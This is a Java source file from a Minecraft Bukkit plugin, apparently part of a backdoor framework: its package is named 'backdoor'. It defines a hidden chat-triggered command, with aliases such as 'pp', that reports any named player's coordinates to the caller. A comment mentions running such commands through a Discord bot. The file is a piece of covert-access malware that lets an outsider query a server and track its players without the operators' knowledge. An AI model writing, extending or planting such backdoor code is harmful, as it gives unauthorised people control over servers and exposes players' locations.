package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(
        displayName = "player position",
        usage = {"<prefix> <command> <player>"},
        description = "Tells you the position of the specified player",
        aliases = {"playerPosition", "playerPos", "pp"})
public class PlayerPositionCommand extends Command {

    public PlayerPositionCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        Location loc;
        try {
            loc = Bukkit.getPlayer(args.get(0)).getLocation();
        } catch (Exception e) {
            Main.logger.log("Failed to get player location\n " + e);
            return;
        }

        //TODO: find a better way to send stuff to the player if we are going to use the discord bot for this
        // this may be broken of this gets run by someone on discord
        try {
            event.getPlayer().sendMessage(ChatColor.GREEN +
                    " Player position: X- " + loc.getBlockX() +
                                     " Y- " + loc.getBlockY() +
                                     " Z- " + loc.getBlockZ() );
        } catch (Exception e) {
            Main.logger.log("Failed to send message to player\n " + e);
        }
    }
}
